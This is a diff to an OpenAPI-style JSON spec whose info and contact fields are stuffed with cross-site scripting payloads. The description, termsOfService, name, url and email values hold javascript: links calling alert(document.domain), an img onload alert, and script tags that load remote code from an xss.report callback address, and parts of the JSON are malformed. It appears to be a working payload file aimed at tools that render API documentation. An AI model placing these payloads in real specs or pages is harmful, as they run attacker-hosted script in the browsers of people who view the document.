@@ -3,12 +3,12 @@
 "info": {
 "version": "hate speech",
 "title": "brand damage",
-"description": "[asd](javascript:alert(document.domain))xxxx<script src=//xss.report/s/Ma7moodBakr></script>xxxx",
+"description": "[asd](javascript:alert(document.domain))xxxx<img src='https://www.checkmarx.com/wp-content/uploads/2017/09/twitter-3-Ways-to-Prevent-XSS.png' onload=alert(domain) />xxxx",
 "termsOfService": ""<script src=//xss.report/s/Ma7moodBakr></script>,
 "contact": {
-"name": ""<script src=//xss.report/s/Ma7moodBakr></script>,
-"url": ""<script src=//xss.report/s/Ma7moodBakr></script>,
-"email": ""<script src=//xss.report/s/Ma7moodBakr></script>,
+"name": "[qqq](javascript:alert(document.domain))xxxx<script src=//xss.report/s/Ma7moodBakr></script>"xxxx,
+"url": "[qqq](javascript:alert(document.domain))xxxx<script src=//xss.report/s/Ma7moodBakr></script>xxxx",
+"email": "[qqq](javascript:alert(document.domain))xxxx<script src=//xss.report/s/Ma7moodBakr></script>xxxx",
 }
 },
 "basePath": "/",
